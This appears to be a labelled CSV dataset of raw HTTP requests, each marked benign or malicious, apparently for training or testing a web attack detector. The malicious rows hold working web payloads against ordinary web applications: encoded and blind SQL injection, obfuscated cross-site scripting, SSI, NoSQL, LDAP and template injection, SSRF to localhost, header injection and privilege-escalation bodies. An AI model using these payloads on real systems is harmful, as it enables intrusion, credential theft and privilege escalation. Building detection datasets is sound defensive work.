label,text
malicious,"POST /user/profile/update HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Referer: https://trusted-partner-site.com/allowed_path
Content-Type: application/x-www-form-urlencoded
Content-Length: 38
Cookie: sessionId=3f1e9b72c45d9f2a7d2b8020a1fadf47

email=new.email%40examplemail.net&name=John+Doe"
benign,"GET /search/query?query=download+free+photoshop+brushes HTTP/1.1
Host: creative-tools-gallery.ai
User-Agent: curl/7.85.0
Accept: text/html
Referer: https://creative-tools-gallery.ai/resources/brushes
Connection: close"
benign,"OPTIONS /rest/v1/shops/9231 HTTP/1.1
Host: ecommerce-hub360.biz
Origin: https://admin.marketworkflow.store
Access-Control-Request-Method: DELETE
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Mobile/15E148 Safari/604.1
Access-Control-Request-Headers: authorization
Accept: */*
Accept-Encoding: gzip, deflate
Connection: keep-alive"
malicious,"POST /api/v2/system/update_config HTTP/1.1
Host: infra-dashboard-secure.biz
Content-Type: application/json
Content-Length: 264
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.9
Origin: https://infra-dashboard-secure.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36

{""system_info"": {""uptime"": ""48h"", ""load_avg"": 0.85}, ""config"": {""user_settings"": {""preferences"": {""detail_level_param"": ""JyBVTklPTiBTRUxFQ1QgdXNlciwgcGFzc3dvcmQgRlJPTSB1c2VycyAtLQ=="", ""backup_enabled"": false}}}}"
benign,"GET /media/gallery/summer-2023 HTTP/1.1
Host: bright-visuals.photos
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8
Accept-Language: en-US,en;q=0.9,de;q=0.7
Accept-Encoding: gzip, deflate, br
Referer: https://bright-visuals.photos/home
Cookie: user_session=b9c72f18dad14565928bae1f3de8817a; last_album=summer-2023
DNT: 1
Sec-CH-UA: ""Chromium"";v=""114"", ""Not:A-Brand"";v=""99""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""Windows""
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document"
benign,"GET /api/v5/search?q=TG9jYWxBdHRyaWJ1dGVz&continuation=RW5kcG9pbnQ5MDcyNQ==&params=eyJyZWdpb24iOiJldSIsImNhdGVnb3J5IjoiYXBwcyJ9 HTTP/1.1
Host: user-data-exchange.org
Accept: application/json
User-Agent: curl/7.88.1
Via: 1.1 proxy23.example.net
Connection: close"
benign,"GET /forums/game-dev-discussion/thread/4589 HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 12_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Accept-Encoding: gzip, deflate, br
Referer: https://community.game-dev-forum.org/forums/game-dev-discussion
Cookie: forum_session=582fafe1d62a1c7c; theme=dark
DNT: 1
Sec-CH-UA: ""Chromium"";v=""115"", ""Google Chrome"";v=""115"", "";Not A Brand"";v=""24""
Sec-CH-UA-Mobile: ?0
Sec-CH-UA-Platform: ""macOS""
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1"
benign,"HEAD /api/v3/ping HTTP/1.1
Host: cloud-infra-control.ai
User-Agent: Go-http-client/1.1
Accept: application/json
X-Forwarded-For: 192.168.100.55"
malicious,"POST /checkout/confirm HTTP/1.1
Host: secure-checkout.payment-gateway.ai
Content-Type: application/x-www-form-urlencoded
Content-Length: 145
User-Agent: Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)

order_id=456&confirm_b64=cHJvZHVjdF9pZD0xMjM7IFVQREFURSB1c2VycyBTRVQgYWRtaW49MSBXSEVSRSBpZD0xOyAtLQ=="
benign,"GET /api/v2/resources?id=503 HTTP/1.1
Host: api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
Accept: */*
Accept-Encoding: gzip
Via: 1.1 varnish
Connection: close"
benign,"GET /sitemap_products_1.xml HTTP/1.1
Host: online-retail-marketplace.biz
Accept: application/xml, text/xml
User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:110.0) Gecko/20100101 Firefox/110.0
Accept-Encoding: gzip, deflate, br
Connection: keep-alive"
benign,"PUT /static/v2/css/fonts/fontawesome-webfont.woff2 HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.63 Safari/537.36
Content-Type: application/octet-stream
Content-Length: 400
Accept-Encoding: br, gzip, deflate
Referer: https://community.game-dev-forum.org/forums/threads/css-updates
Cache-Control: max-age=0
Connection: keep-alive

AAEAAAASAQAABAAgR0RFRrRCsIIAAV2AAAAYGNtYXAXLoZpAAHUAAADVmdhc0D4aGf2AAAKyAAAADZnbHlmYewA4igAAAXMAAAZQaGVhZIFGPRMAAVIAAAAmbG9jYQ0pC6EAAFMgAAAEZm1heHAAAGA8AAACCAAAAAgbmFtZWB0PjUAAEwkAAABl3Bvc3QAAAAAAAEYNAAAAQAAAAEAAgAgAAUA"
benign,"POST /oauth/token HTTP/1.1
Host: auth-secure-gateway.ai
Content-Type: application/x-www-form-urlencoded
Authorization: Basic Y2xpZW50QXI6c2VjdXJlU2VjcmV0MTIz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Accept: application/json
Content-Length: 123

grant_type=authorization_code&code=3a1b9f2d7c&redirect_uri=https%3A%2F%2Fapp.auth-secure-gateway.ai%2Fcallback&client_id=clientAr&client_secret=secureSecret123"
benign,"POST /user/comments HTTP/1.1
Host: community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/109.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 97
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://community.game-dev-forum.org/forums/updates
Connection: keep-alive

username=PixelCoder&threadId=2549&comment=VGhpcyBmb3J1bSBpcyBodWxsaW5nIG1lIHRvIGxlYXJuIGEgZ3JlYXQgZGV2ZWxvcG1lbnQgaW4gZ2FtaW5nLg=="
benign,"POST /api/v2/todos/update-status HTTP/1.1
Host: taskflow-manager.appsync.ai
Content-Type: application/json
Accept: application/json
Origin: https://taskflow-manager.appsync.ai
X-Requested-With: FetchAPIClient
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJh...L4-H2iq0
X-CSRF-Token: d77efcdf3af9421fa309c73889b75363
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.124 Safari/537.36
Content-Length: 52

{""todoId"":107,""status"":""completed"",""notify"":true}"
malicious,"POST /user/settings HTTP/1.1
Host: community.game-dev-forum.org
Content-Type: application/x-www-form-urlencoded
Content-Length: 73
Origin: https://community.game-dev-forum.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Cache-Control: no-cache
Accept-Encoding: gzip, deflate, br

about_me=Love+gaming.+<!--#include   fILe=""/etc/issue""    -->+Cheers"
benign,"GET /products/search?query=organic+skincare+sets HTTP/1.1
Host: pure-beauty-care.co
Accept: text/html
Referer: https://pure-beauty-care.co/shop
User-Agent: Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)
Accept-Language: en-US
Connection: keep-alive"
benign,"POST /auth/token HTTP/1.1
Host: auth.my-media-network.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 102
Connection: keep-alive
Cache-Control: no-cache
Pragma: no-cache
Accept-Language: en-US,en;q=0.9
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/113.0

user=jimmy.wright&passphrase=StellarDay48&redirect_uri=https%3A%2F%2Fapp.my-media-network.net%2Fdashboard%2Foverview"
benign,"POST /community/post/create HTTP/1.1
Host: community.game-dev-forum.org
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 352
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.7
User-Agent: Mozilla/5.0 (Linux; Android 13; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Mobile Safari/537.36
Origin: https://community.game-dev-forum.org
Referer: https://community.game-dev-forum.org/posts/new
Cookie: auth_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiamFkZXciLCJpYXQiOjE2ODk2MjY1NDEsImV4cCI6MTY4OTY2MjE0MX0.LmfLzyWsXQo5PCrUebe-gTVrkncPeA0uXix8XLRn108

title=Best+practices+for+indie+game+marketing&body=Hello+all%2C+I%27ve+been+working+on+my+first+indie+game+and+I%27d+love+to+hear+any+tips+or+resources+for+marketing+indie+games.+Thanks+in+advance%21&tags=indie%2Cmarketing%2Cgame-dev&category=Marketing&anonymous_post=no&notify_replies=yes&language=en&video_embed=https%3A%2F%2Fyoutu.be%2Fabcd1234&attachments=&post_visibility=public&is_featured=no&allow_comments=yes&poll_question=&poll_options=&reward_points=10&thread_locked=no&parent_post_id=0&edit_history=&geo_location=US&platform=android&app_version=2.11.0"
benign,"POST /v1/chat/conversation/messages HTTP/1.1
Host: messenger-app-cloud.ai
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Accept: application/json
Content-Type: application/json
Accept-Language: en-US,en;q=0.9
Content-Length: 109
Connection: close

{""messages"":[""Hello, how are you?"",""Did you get my last message?"",""Looking forward to our meeting."",""Please confirm the schedule.""]}"
benign,"GET /images/logo.svg HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: python-requests/2.28.2
Accept: image/svg+xml,image/png,image/*,*/*;q=0.5
Cache-Control: no-cache
Connection: close"
malicious,"POST /account/preferences HTTP/1.1
Host: secure-user-portal.net
User-Agent: curl/7.75.0
Content-Type: application/x-www-form-urlencoded
Accept: */*
Content-Length: 56
Cookie: user_session=abc123xyz456

pref_lang=en-US&display_mode=compact'%7D%2C%20%24or%3A%20%5B%7Badmin%3Atrue%7D%5D%20--%20"
malicious,"POST /blog/article/comment HTTP/1.1
Host: my-personal-blog-site.info
Content-Type: application/x-www-form-urlencoded
Content-Length: 169
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15
Cache-Control: no-cache

article_id=987&commenter=alice&comment=%3Cscript%3Eeval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))%3C%2Fscript%3E"
malicious,"POST /cart/add-item HTTP/1.1
Host: shopwise-delights.biz
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Cookie: session_id=2f9a3f7c1d; tracking_id=xyz' OR /*!IF*/(ASCII(SUBSTRING((SELECT/**/password FROM users WHERE username='admin'),1,1))=97, SLEEP(5),0)#; preferred_currency=USD
Cache-Control: no-cache

product_id=123&quantity=1"
benign,"GET /shop/electronics/audio/headphones-pro-max HTTP/1.1
Host: electro-marketplace.store
User-Agent: Googlebot/2.1 (+http://www.google.com/bot.html)
Accept: text/html,application/xhtml+xml
Accept-Encoding: br, gzip
Referer: https://electro-marketplace.store/shop/electronics/audio
Connection: keep-alive"
benign,"GET /resource/load?path=assets/images/banner.jpg HTTP/1.1
Host: media-gallery-hub.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Connection: keep-alive
Referer: https://media-gallery-hub.net/home"
malicious,"POST /api/v1/feedback/submit HTTP/1.1
Host: feedback-portal.enterprise-solutions.org
User-Agent: Wget/1.21.1 (linux-gnu)
Accept: */*
Content-Type: application/json
Content-Length: 78
Referer: https://feedback-portal.enterprise-solutions.org/form
Connection: close

{""redirectUrl"":""http://0177.000.000.001:8080/internal/api/verify?user=guest&access=limited""}"
benign,"POST /account/settings HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
Connection: close
Referer: https://secure-user-portal.net/account/settings
Origin: https://secure-user-portal.net
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.4 Safari/605.1.15
Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9; prefs=darkmode

display_name=Michael+Lee&bio=Tech+lover+and+photographer+from+NYC&website_url=https%3A%2F%2Fmleeportfolio.dev&location=New+York%2C+NY"
benign,"HEAD /downloads/releases/v3.14.2/setup_x64.msi HTTP/1.1
Host: secure-software-updates.org
User-Agent: Wget/1.21.3 (linux-gnu)
Accept: */*
Accept-Encoding: identity
Connection: close"
benign,"POST /contact/send HTTP/1.1
Host: secure-user-portal.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Linux; Android 12; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Mobile Safari/537.36
Accept-Encoding: gzip, deflate
Cookie: sessionid=af395dbe9cf047e6a1b2462faab754a6
Content-Length: 115
Connection: keep-alive

message=I+had+to+UPDATE+the+database+entries+after+finding+that+the+old+records+weren%27t+reflecting+real+time+data."
benign,"GET /api/v1/streaming/shows?genre=comedy&limit=25&page=2 HTTP/1.1
Host: mediasurfer.streamingservice.net
Accept: application/json
Authorization: Bearer eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.e30.cQXH9uUIXqjOCDIis7nwpvRdxCoUL7xBofybnxsf9H0z1xvLnNYzVdOTpiBWb0fKY6OaXLFoNrmkgWIwyIo0faQ
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5 Build/RQ3A.210705.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.61 Mobile Safari/537.36
Accept-Language: en-US,en;q=0.9
Connection: keep-alive"
malicious,"GET /public/info?preview_text=%7B%7B%207*%277%27%20%7D%7D HTTP/1.1
Host: secure-user-portal.net
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.9
Cache-Control: max-age=0
Connection: keep-alive"
benign,"POST /api/v2/user/profile/update HTTP/1.1
Host: secure-user-portal.net
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.abcd1234efgh5678ijkl9012mnop3456qrst7890
Content-Type: application/json
Content-Length: 92
Idempotency-Key: c1a9c9d2-3f5e-4b09-b8f4-9708b541d6a1
X-Request-ID: 89ef291a-2a6b-4a12-9475-e094bc7f08f1
X-Client-Version: 3.5.7
Accept: application/json
Connection: keep-alive

{""username"":""robin.lawrence"",""email"":""robin.lawrence@secure-user-portal.net"",""notifications"":true}"
malicious,"GET /users/ldap?department=%2A%29%28objectClass%3Dperson%29%29%7C%28!(cn%3Dadmin)%29 HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Referer: https://online-retail-store.biz/login
Connection: keep-alive"
benign,"GET /assets/manuals/software_setup_guide.pdf HTTP/1.1
Host: cloudnet-data-services.com
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: application/pdf
Referer: https://cloudnet-data-services.com/downloads/manuals
Accept-Encoding: br, gzip
Accept-Language: en-US,en;q=0.8
Connection: keep-alive"
benign,"POST /feedback/send HTTP/1.1
Host: techhelpdesk.supporthub.co
Content-Type: application/x-www-form-urlencoded
Content-Length: 115
Referer: https://techhelpdesk.supporthub.co/feedback
Origin: https://techhelpdesk.supporthub.co
User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.100 Safari/537.36
Cookie: session_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9
Connection: keep-alive

name=Javier+Martinez&email=javier.martinez%40supporthub.co&subject=Feature+Request&message=Could+you+add+a+dark+mode+option+to+the+dashboard+interface%3F+Thanks."
benign,"GET /rss_atom_feed HTTP/1.1
Host: my-personal-blog-site.info
Accept: application/rss+xml, application/xml
User-Agent: curl/7.85.0
Referer: https://my-personal-blog-site.info/articles
DNT: 1
Connection: close"
malicious,"PATCH /api/v4/profiles/84521 HTTP/1.1
Host: my-personal-blog-site.info
User-Agent: Python-urllib/3.9
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiODQ1MjEiLCJyb2xlIjoiY29udHJpYnV0b3IiLCJleHAiOjE2ODc1MTMwMDB9.A_xdy2cFd_8fRbj1WJfo9vOdzQ45wlQM2KKWy4E4sHU
Content-Type: application/json
Accept: application/json
Content-Length: 218

{
  ""details"": {
    ""nickname"": ""tester"",
    ""location"": ""unknown""
  },
  ""settings"": {
    ""theme"": ""dark"",
    ""advanced_config"": {
      ""superuser_access"": true,
      ""credit_balance"": 88888
    }
  }
}"
benign,"GET /archives/2023/11/20/education-innovations HTTP/1.1
Host: scholar-view.org
Connection: keep-alive
Accept: text/html,application/xhtml+xml,application/xml;q=0.8
Referer: https://search.yahoo.com/
Accept-Language: en-US,en;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:111.0) Gecko/20100101 Firefox/111.0"
benign,"PATCH /v3/orders/7721/ HTTP/1.1
Host: retail-fastbuy.ai
Authorization: Bearer ZHXAmKJFG8U271WOIEP9
Content-Type: application/json-patch+json
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en;q=0.9
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.1 Safari/605.1.15
Referer: https://retail-fastbuy.ai/orders

[{""op"": ""replace"", ""path"": ""/shipping/address/street"", ""value"": ""412 Evergreen Terrace""}, {""op"": ""add"", ""path"": ""/notes"", ""value"": ""Customer prefers morning delivery.""}]"
benign,"GET /media/downloads?file=report-final.pdf HTTP/1.1
Host: enterprise-cloud-services.biz
Accept: application/pdf
Accept-Encoding: gzip, deflate, br
User-Agent: Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/112.0
Referer: https://enterprise-cloud-services.biz/reports
Connection: keep-alive"
malicious,"GET /app/login?redirect_url=https%3A%2F%2Fdashboard.api.cloud-data-services.ai%2Fv2%2Fstart%3Fuser%3Dadmin%250d%250aSet-Cookie%3A%20isAdmin%3Dtrue HTTP/1.1
Host: auth.api.cloud-data-services.ai
User-Agent: Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Referer: https://login.api.cloud-data-services.ai/
Cache-Control: no-cache
Connection: close"
benign,"DELETE /api/v5/content/posts/33220 HTTP/1.1
Host: community-blogging-hub.info
Authorization: Bearer JHLKJ1289asd903ad802nlwje
If-Match: ""post-tag-5544""
User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1
Accept: application/json, text/plain, */*
Connection: keep-alive"
benign,"POST /subscriptions/manage HTTP/1.1
Host: online-retail-store.biz
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.138 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Content-Length: 45
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: https://online-retail-store.biz/account/settings
Cookie: sessionid=69201fb9d3a1c7ef3a146ac1557b2042

subscriptions[]=daily_deals&subscriptions[]=new_arrivals&email_notifications=yes"
